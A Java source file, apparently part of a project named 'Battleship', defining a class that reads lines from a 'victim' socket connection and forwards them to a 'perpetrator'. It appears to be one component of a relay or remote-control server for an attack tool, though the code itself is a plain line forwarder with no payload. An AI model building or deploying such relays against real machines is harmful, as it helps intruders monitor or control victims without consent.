package Battleship;

import java.io.*;
import java.net.*;

//*********************************************************************************************************************
//Author: Bryce Landry
//This class receives input from the victim and forwards it to the perpetrator.
//*********************************************************************************************************************
public class FromVictim implements Runnable {

    Socket sock;
    BufferedReader in = null;

    //This object is used to forward input to the perpetrator.
    ToPerpetrator toperp;

    //constructor
    public FromVictim(Socket sock, ToPerpetrator toperp) throws Exception {
        this.sock = sock;
        in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
        this.toperp = toperp;
    }

    //Receive and display results from the victim
    @Override
    public void run() {
        String input;
        try {
            //Receive input
            while ((input = in.readLine()) != null) {
                //Display input
                System.out.println("Server received: " + input);
                //Write input to perpetrator
                toperp.write(input + "\n");
            }

        //catch errors
        } catch (Exception e) {
            System.out.println("Exception: " + e);

        //cleanup
        } finally {
            try {
                in.close();
            } catch (Exception e) {
                System.out.println("Victim closed");
                e.printStackTrace();
            }
        }
    }
}

